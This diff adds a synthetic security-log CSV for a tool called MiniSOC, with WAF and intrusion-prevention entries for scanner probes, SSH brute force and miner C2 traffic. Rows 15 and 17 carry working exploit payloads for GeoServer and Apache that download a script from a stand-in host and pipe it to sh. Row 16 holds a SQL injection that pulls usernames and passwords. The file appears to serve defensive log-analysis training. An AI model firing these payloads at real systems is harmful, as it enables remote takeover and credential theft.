@@ -1,0 +1,181 @@
+﻿Security Logs (synthetic sample for MiniSOC)
+Filter
+Period: ,2026-07-09 20:00 - 2026-07-10 02:00
+Src Zone: ,All
+Src IP: ,All
+Dst Zone: ,All
+Dst IP: ,All
+Type: ,"Web App Firewall, Intrusion Prevention, Botnet Detection"
+Threat Level: ,"Critical, High, Medium"
+Action: ,"Allow, Deny"
+"Results(""-"" indicates that this field is empty, and ""#"" indicates that there is no such a field.)"
+No. ,Time,Type,Attack Type,Src Address,XFF IP,Src IP Location,Dst Address,Dst IP Location,Threat Level,Action,Src Zone,Src Port,Dst Zone,Dst Port,Matched Policy,Description,Protocol,URL/Directory,Vuln ID,Vuln Name,Recommendation,Reference,Data Packet,Sangfor Security Wiki
+1,2026-07-10 00:39:13,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40013,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe13,11020013,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe13 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+2,2026-07-10 00:36:12,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40012,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe12,11020012,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe12 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+3,2026-07-10 00:33:11,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40011,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe11,11020011,Apache OFBiz XXE Vulnerability(CVE-2018-8033),-,-,"REQUEST:
+GET /probe11 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+4,2026-07-10 00:30:10,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40010,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe10,11020010,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe10 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+5,2026-07-10 00:27:19,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40009,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe9,11020009,Apache OFBiz XXE Vulnerability(CVE-2018-8033),-,-,"REQUEST:
+GET /probe9 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+6,2026-07-10 00:24:18,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40008,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe8,11020008,Oracle WebLogic Authentication Bypass Vulnerability(CVE-2020-14883),-,-,"REQUEST:
+GET /probe8 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+7,2026-07-10 00:21:17,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40007,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe7,11020007,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe7 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+8,2026-07-10 00:18:16,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40006,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe6,11020006,Apache OFBiz XXE Vulnerability(CVE-2018-8033),-,-,"REQUEST:
+GET /probe6 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+9,2026-07-10 00:15:15,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40005,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe5,11020005,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe5 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+10,2026-07-10 00:12:14,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40004,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe4,11020004,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe4 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+11,2026-07-10 00:09:13,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40003,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe3,11020003,Apache OFBiz XXE Vulnerability(CVE-2018-8033),-,-,"REQUEST:
+GET /probe3 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+12,2026-07-10 00:06:12,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40002,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe2,11020002,Oracle WebLogic Authentication Bypass Vulnerability(CVE-2020-14883),-,-,"REQUEST:
+GET /probe2 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+13,2026-07-10 00:03:11,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40001,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe1,11020001,Apache Struts2 Remote Code Execution Vulnerability(CVE-2013-2251),-,-,"REQUEST:
+GET /probe1 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+14,2026-07-10 00:00:10,Intrusion Prevention,web Vulnerability,192.0.2.250,-,United States,10.20.30.40,-,High,Allow,WAN,40000,DMZ,80,Server Protection Policy,Generic web exploit probe.,TCP,portal.example.com/probe0,11020000,Oracle WebLogic Authentication Bypass Vulnerability(CVE-2020-14883),-,-,"REQUEST:
+GET /probe0 HTTP/1.1
+Host: portal.example.com
+User-Agent: Mozilla/5.0
+X-Scanner: ExampleASM DeepScan
+
+RESPONSE:
+HTTP/1.1 302 Found
+",-
+15,2026-07-09 23:12:09,Intrusion Prevention,web Vulnerability,198.51.100.150,-,United States,10.20.30.40,-,Critical,Allow,WAN,60011,DMZ,8080,Server Protection Policy,GeoServer OGC filter RCE.,TCP,"203.0.113.10:8080/geoserver/wfs?valueReference=exec(java.lang.Runtime.getRuntime(),'bash -c {echo,d2dldCBodHRwOi8vMTkyLjAuMi45OS9ib3Quc2ggLU8gLSB8IHNo}|{base64,-d}|sh')",11027423,Geoserver Remote Code Execution Vulnerability(CVE-2024-36401),-,CVE-2024-36401,"REQUEST:
+GET /geoserver/wfs?valueReference=exec(java.lang.Runtime.getRuntime(),%27bash%20-c%20%7Becho%2Cd2dldCBodHRwOi8vMTkyLjAuMi45OS9ib3Quc2ggLU8gLSB8IHNo%7D%7C%7Bbase64%2C-d%7D%7Csh%27) HTTP/1.1
+Host: 203.0.113.10:8080
+
+RESPONSE:
+HTTP/1.1 200 OK
+",-
+16,2026-07-09 22:31:40,Web App Firewall,SQL injection,203.0.113.77,-,Russia,10.20.30.40,-,Critical,Deny,WAN,51990,DMZ,443,Server Protection Policy,SQL injection attempt in query string.,TCP,"shop.example.com/item.php?id=1' UNION SELECT username,password FROM users--",13000101,SQL Injection Attack,-,-,"REQUEST:
+GET /item.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1
+Host: shop.example.com
+User-Agent: sqlmap/1.8
+
+RESPONSE:
+HTTP/1.1 403 Forbidden
+",-
+17,2026-07-09 22:05:17,Intrusion Prevention,web Vulnerability,203.0.113.77,-,Russia,10.20.30.40,-,High,Allow,WAN,51544,DMZ,80,Server Protection Policy,Apache HTTP Server 2.4.49 path traversal.,TCP,203.0.113.10:80/cgi-bin/../../../../bin/sh,11023864,Apache HTTP Server Path Traversal Vulnerability(CVE-2021-41773),-,CVE-2021-41773,"REQUEST:
+POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Host: 203.0.113.10:80
+User-Agent: libredtail-http
+
+(wget --no-check-certificate -qO- https://192.0.2.66/sh || curl -sk https://192.0.2.66/sh) | sh -s apache.selfrep
+RESPONSE:
+HTTP/1.1 403 Forbidden
+",-
+18,2026-07-09 21:44:03,Intrusion Prevention,trojan Vulnerability,10.20.30.15,-,-,192.0.2.200,-,High,Allow,DMZ,41022,WAN,3333,Outbound Policy,MALWARE-CNC Miner BotNet For Mining.subscribe Request Traffic,TCP,-,10041373,MALWARE-CNC Miner BotNet For Mining.subscribe Request Traffic,-,-,7B226964223A312C226D6574686F64223A226D696E696E672E737562736372696265222C22706172616D73223A5B5D7D,-
+19,2026-07-09 20:12:52,Intrusion Prevention,Brute-force attack,203.0.113.45,-,Brazil,10.20.30.15,-,High,Allow,WAN,42211,DMZ,22,Server Protection Policy,"Attacker exploits SSH Protocol to launch brute-force attack.
+Type: medium and low
+Attack started: 2026-07-09 19:31:10
+Duration: 3600 seconds 
+Attempts: 77 attacks
+Result: -",TCP,-,11080017,SSH Server medium and low attack encountered,-,-,-,-
+20,2026-07-09 20:11:51,Intrusion Prevention,Brute-force attack,198.51.100.88,-,Germany,10.20.30.15,-,High,Allow,WAN,41211,DMZ,22,Server Protection Policy,"Attacker exploits SSH Protocol to launch brute-force attack.
+Type: medium and low
+Attack started: 2026-07-09 19:02:44
+Duration: 3600 seconds 
+Attempts: 51 attacks
+Result: -",TCP,-,11080017,SSH Server medium and low attack encountered,-,-,-,-
+21,2026-07-09 20:10:50,Intrusion Prevention,Brute-force attack,198.51.100.23,-,Netherlands,10.20.30.15,-,High,Allow,WAN,40211,DMZ,22,Server Protection Policy,"Attacker exploits SSH Protocol to launch brute-force attack.
+Type: medium and low
+Attack started: 2026-07-09 18:10:02
+Duration: 3600 seconds 
+Attempts: 64 attacks
+Result: -",TCP,-,11080017,SSH Server medium and low attack encountered,-,-,-,-
